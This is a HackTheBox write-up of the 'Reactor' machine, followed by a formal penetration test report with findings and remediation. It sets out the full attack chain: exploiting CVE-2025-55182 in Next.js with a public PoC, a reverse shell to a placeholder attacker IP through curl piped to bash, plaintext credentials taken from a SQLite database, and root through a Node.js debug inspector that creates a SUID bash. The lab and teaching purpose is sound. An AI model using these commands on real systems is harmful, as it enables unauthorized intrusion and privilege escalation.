@@ -1,21 +1,333 @@
 # Reactor
 
 **Platform:** HackTheBox
+**OS:** Linux
+**Tags:** Next.js, CVE-2025-55182, RCE, SQLite, Node.js, Debug Inspector
 **Date:** 2026-06-12
 
-Active machine - content will be published upon retirement.
+Port 3000 is running a Next.js 15.0.3 nuclear monitoring dashboard with no authentication on the CVE-2025-55182 RCE path. The exploit lands a shell as `node`. The app stores its SQLite database unprotected in the app directory, which holds credentials for `engineer`. From `engineer`, a Node.js debug inspector is listening on `127.0.0.1:9229` running as root. The inspector gives a JavaScript REPL at root privilege, so one exec call sets the SUID bit on bash and the machine is done.
+
+## 1. Enumeration
+
+```bash
+nmap -sC -sV -p- <TARGET_IP>
+```
+
+```
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp   open  http    nginx
+3000/tcp open  http    Node.js (Next.js)
+```
+
+Initial scan comes back with SSH and nginx, but the default port scan stops there. Running a full port scan picks up port 3000.
+
+Port 3000 is ReactorWatch, a nuclear core monitoring dashboard. Checking response headers confirms the version:
+
+```bash
+curl -sI http://<TARGET_IP>:3000/
+```
+
+```
+X-Powered-By: Next.js
+```
+
+Wappalyzer pins the version at Next.js 15.0.3. Running nuclei against port 3000 confirms CVE-2025-55182.
+
+```bash
+nuclei -target http://<TARGET_IP>:3000/
+```
+
+## 2. Foothold: CVE-2025-55182 (RCE as node)
+
+CVE-2025-55182 is a pre-auth remote code execution vulnerability in Next.js 15.0.3 affecting the React Server Component request path. No authentication is required. The public Python PoC takes a target and a command. Confirming execution first:
+
+```bash
+python3 CVE-2025-55182.py -t http://<TARGET_IP>:3000/ -c "id"
+```
+
+```
+uid=999(node) gid=999(node) groups=999(node)
+```
+
+Blind execution confirmed as `node`. Getting a shell by hosting a payload and fetching it on the target:
+
+```bash
+cat > /tmp/s.sh << 'EOF'
+bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+EOF
+
+python3 -m http.server 80
+penelope -p 4444
+```
+
+```bash
+python3 CVE-2025-55182.py -t http://<TARGET_IP>:3000/ -c "curl http://<ATTACKER_IP>/s.sh|bash"
+```
+
+```
+[+] [New Reverse Shell] => reactor <TARGET_IP> node(999)
+node@reactor:/opt/reactor-app$ id
+uid=999(node) gid=999(node) groups=999(node)
+```
+
+## 3. Lateral movement: SQLite credentials to engineer
+
+The app directory has a SQLite database sitting alongside the application code:
+
+```bash
+ls /opt/reactor-app/
+```
+
+```
+reactor.db  app/  node_modules/  package.json
+```
+
+```bash
+sqlite3 /opt/reactor-app/reactor.db .tables
+sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"
+```
+
+The database contains credentials for the `engineer` account. SSH in directly:
+
+```bash
+ssh engineer@<TARGET_IP>
+```
+
+## 4. Privilege escalation: Node.js Debug Inspector
+
+Checking what is listening on localhost:
+
+```bash
+ss -tunlp
+```
+
+```
+127.0.0.1:9229  LISTEN
+```
+
+```bash
+ps aux | grep node
+```
+
+```
+root ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+```
+
+Root is running Node.js with the debug inspector exposed on `127.0.0.1:9229`. The debug inspector exposes a JavaScript REPL that executes as the process owner. Since this process is root, connecting gives arbitrary code execution as root. Connect to it:
+
+```bash
+node inspect 127.0.0.1:9229
+```
+
+Verify the current process UID:
+
+```
+exec("process.getuid()")
+// 0
+```
+
+Copy bash and set the SUID bit:
+
+```
+exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
+.exit
+```
+
+```bash
+/tmp/r00t -p
+```
+
+```
+r00t-5.1# id
+uid=1001(engineer) gid=1001(engineer) euid=0(root) egid=0(root)
+```
+
+## 5. Flags
+
+- User: `redacted`
+- Root: `redacted`
 
 ---
 
 ## Penetration Test Report
 
+**Target:** reactor.htb
+**Address:** <TARGET_IP>
 **Assessment type:** External network & web application assessment
 **Assessment date:** 12 June 2026
-**Status:** Active - Embargoed
-**Environment:** HackTheBox laboratory assessment
+**Environment:** HackTheBox laboratory assessment  |  Linux
 **Prepared by:** Ledion Mujaj
 **Reference:** HTB-RCT-01
 
-> **Report Embargoed** - Full report will be published upon machine retirement.
+---
+
+## 1. Executive Summary
+
+Testing of **reactor.htb** identified three findings that together produced full root compromise. The host exposed a Next.js 15.0.3 application on port 3000 affected by CVE-2025-55182, a pre-authentication remote code execution vulnerability requiring no credentials. Exploitation delivered a shell as the `node` service account. An SQLite database in the application directory stored credentials for the `engineer` account in plaintext, enabling lateral movement via SSH. A root-owned Node.js process was running with the debug inspector bound to `127.0.0.1:9229`. Connecting to the inspector provided an authenticated JavaScript REPL running as root, which was used to place an SUID copy of bash and obtain a root shell.
+
+**Priority recommendations:**
+
+1. Patch Next.js to a version that is not affected by CVE-2025-55182 or take the application offline until patching is complete.
+2. Remove the SQLite database from the application directory and store credentials out of reach of the application service account, or replace plaintext credentials with a properly hashed scheme.
+3. Disable the Node.js debug inspector in any production or shared environment. If it is required for diagnostics, bind it to a socket with restricted permissions, not a TCP port, and never run it as root.
 
 ---
+
+## 2. Assessment Scope and Methodology
+
+| Asset | Address | Description |
+|-------|---------|-------------|
+| reactor.htb | <TARGET_IP> | Ubuntu Linux; SSH on 22, nginx on 80, Next.js 15.0.3 on 3000. |
+
+| Port | Service | Observed detail |
+|------|---------|----------------|
+| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu |
+| 80/tcp | HTTP | nginx; no content of interest |
+| 3000/tcp | HTTP | Next.js 15.0.3 ReactorWatch dashboard, unauthenticated |
+
+Testing began with a full port scan. The Next.js version was identified from response headers and confirmed vulnerable to CVE-2025-55182 via nuclei. A Python PoC was used to achieve blind command execution, and a hosted shell payload was fetched and executed to establish an interactive session as `node`. Post-foothold enumeration of the application directory revealed an SQLite database containing user credentials. Those credentials were used to authenticate via SSH as `engineer`. Process enumeration identified a root-owned Node.js process running with the debug inspector on `127.0.0.1:9229`. The inspector was connected to via `node inspect`, the process UID confirmed as 0, and an SUID copy of bash was created to obtain a root shell.
+
+---
+
+## 3. Results Overview
+
+| Reference | Finding | Severity |
+|-----------|---------|----------|
+| F-01 | Next.js 15.0.3 pre-auth RCE (CVE-2025-55182) | **Critical** |
+| F-02 | SQLite database with plaintext credentials accessible to service account | **High** |
+| F-03 | Root Node.js process with debug inspector bound on localhost TCP | **Critical** |
+
+**Compromise sequence:**
+
+| Stage | Action | Access obtained |
+|-------|--------|----------------|
+| 01 | Identified Next.js 15.0.3 on port 3000. Confirmed CVE-2025-55182 via nuclei. Used Python PoC to fetch and execute a hosted reverse shell payload. | Remote shell as `node` |
+| 02 | Located SQLite database at `/opt/reactor-app/reactor.db`. Queried the users table and retrieved `engineer` credentials. Authenticated via SSH. | SSH shell as `engineer` |
+| 03 | Found root-owned Node.js process with `--inspect=127.0.0.1:9229`. Connected via `node inspect`. Confirmed UID 0. Placed SUID bash copy at `/tmp/r00t`. | Root shell |
+
+---
+
+## 4.1 Next.js 15.0.3 Pre-Auth Remote Code Execution
+
+### F-01   CVE-2025-55182 -- Next.js RCE - CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | The host ran Next.js 15.0.3 on port 3000, affected by CVE-2025-55182. The vulnerability lies in the React Server Component request path and allows an unauthenticated remote attacker to execute arbitrary commands on the host. No credentials or prior access are required. |
+| Prerequisites | Network access to port 3000. No prior credentials required. |
+| Impact | Unauthenticated remote code execution as the `node` service account. Full filesystem access for that account and a foothold to enumerate the host for further escalation. |
+| Affected system | reactor.htb port 3000 -- Next.js 15.0.3 |
+| CVSS 3.1 | 9.8 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-94: Improper Control of Generation of Code |
+
+**Steps to reproduce:**
+
+1. Host a reverse shell script: `echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > /tmp/s.sh && python3 -m http.server 80`
+2. Start a listener: `penelope -p 4444`
+3. Trigger execution: `python3 CVE-2025-55182.py -t http://<TARGET_IP>:3000/ -c "curl http://<ATTACKER_IP>/s.sh|bash"`
+4. Receive shell as `node`.
+
+**Evidence:**
+
+```
+$ python3 CVE-2025-55182.py -t http://<TARGET_IP>:3000/ -c "id"
+uid=999(node) gid=999(node) groups=999(node)
+
+node@reactor:/opt/reactor-app$ id
+uid=999(node) gid=999(node) groups=999(node)
+```
+
+Attacker IP redacted.
+
+**Remediation:** Upgrade Next.js to a version that is not affected by CVE-2025-55182. If an immediate upgrade is not possible, take the application offline or place it behind an access-controlled network boundary until patching is complete. Monitor the Next.js security advisories for patch availability.
+
+**Verification:** Confirm the running Next.js version is not affected. Verify the CVE-2025-55182 PoC no longer produces code execution. Confirm the application is not accessible without appropriate network controls.
+
+---
+
+## 4.2 SQLite Database with Plaintext Credentials Accessible to Service Account
+
+### F-02   /opt/reactor-app/reactor.db -- plaintext credentials - HIGH
+
+| Field | Detail |
+|-------|--------|
+| Description | A SQLite database at `/opt/reactor-app/reactor.db` was readable by the `node` service account. Querying the users table returned plaintext credentials for the `engineer` OS account, enabling direct SSH authentication as that user. |
+| Prerequisites | Read access to `/opt/reactor-app/reactor.db` (accessible via the `node` foothold from F-01). |
+| Impact | Plaintext SSH credentials for `engineer` obtained. Direct SSH authentication as that user. |
+| Affected system | reactor.htb -- `/opt/reactor-app/reactor.db` |
+| CVSS 3.1 | 7.5 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
+| CWE | CWE-312: Cleartext Storage of Sensitive Information |
+
+**Steps to reproduce:**
+
+1. From the `node` shell: `sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"`
+2. Note the plaintext password for `engineer`.
+3. Authenticate: `ssh engineer@<TARGET_IP>`
+
+**Evidence:**
+
+```
+node@reactor:/opt/reactor-app$ sqlite3 reactor.db "SELECT * FROM users;"
+engineer|[redacted]
+
+engineer@reactor:~$ id
+uid=1001(engineer) gid=1001(engineer) groups=1001(engineer)
+```
+
+**Remediation:** Remove the database file from the application directory so it is not accessible to the service account. If a local database is required, restrict permissions to the application user only and ensure OS account credentials are never stored there. Replace any plaintext password storage with a proper hashing scheme using bcrypt or argon2.
+
+**Verification:** Confirm the `node` account can no longer read the database. Verify the `engineer` password has been rotated. Confirm OS account credentials are not stored in any application-accessible file.
+
+---
+
+## 4.3 Root Node.js Process with Debug Inspector on Localhost TCP
+
+### F-03   node --inspect -- root REPL on 127.0.0.1:9229 - CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | A root-owned Node.js process ran `worker.js` with the flag `--inspect=127.0.0.1:9229`, exposing the V8 debug inspector on a local TCP port. Any user on the host who can reach that port obtains a JavaScript REPL executing as root. There is no authentication gating the inspector beyond network locality. |
+| Prerequisites | Local authenticated access as any user. No special privileges required. |
+| Impact | Arbitrary JavaScript execution as root. Full compromise of the host. |
+| Affected system | reactor.htb -- `root` process `/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js` |
+| CVSS 3.1 | 7.8 -- AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-269: Improper Privilege Management |
+
+**Steps to reproduce:**
+
+1. `node inspect 127.0.0.1:9229`
+2. In the inspector: `exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")`
+3. `.exit`
+4. `/tmp/r00t -p`
+
+**Evidence:**
+
+```
+engineer@reactor:~$ node inspect 127.0.0.1:9229
+connecting to 127.0.0.1:9229 ... ok
+debug> exec("process.getuid()")
+0
+debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
+
+engineer@reactor:~$ /tmp/r00t -p
+r00t-5.1# id
+uid=1001(engineer) gid=1001(engineer) euid=0(root) egid=0(root)
+r00t-5.1# cat /root/root.txt
+[redacted]
+```
+
+**Remediation:** Remove the `--inspect` flag from the Node.js process running as root. If a debug inspector is operationally required, run the process as an unprivileged user, bind the inspector to a Unix domain socket with restrictive permissions rather than a TCP port, and ensure it is disabled in any environment where untrusted users have local access.
+
+**Verification:** Confirm no Node.js process runs with `--inspect` or `--inspect-brk` as root. Verify port 9229 is no longer listening. Confirm a local user cannot obtain a root REPL on the host.
+
+---
+
+## 5. Remediation and Assessment Closeout
+
+| Priority | Action | Reference |
+|----------|--------|-----------|
+| Immediate | Upgrade Next.js to a patched version not affected by CVE-2025-55182. Take the application offline until patching is complete. | F-01 |
+| Immediate | Remove `--inspect` flag from root Node.js process. Audit all processes running with debug flags. | F-03 |
+| High | Remove SQLite database from application directory. Rotate `engineer` credentials. Replace plaintext password storage with a hashing scheme. | F-02 |
+
+**Test artefacts:** `/tmp/r00t` (SUID bash copy) and `/tmp/s.sh` (reverse shell script) were created on the target during testing. Both should be confirmed removed.
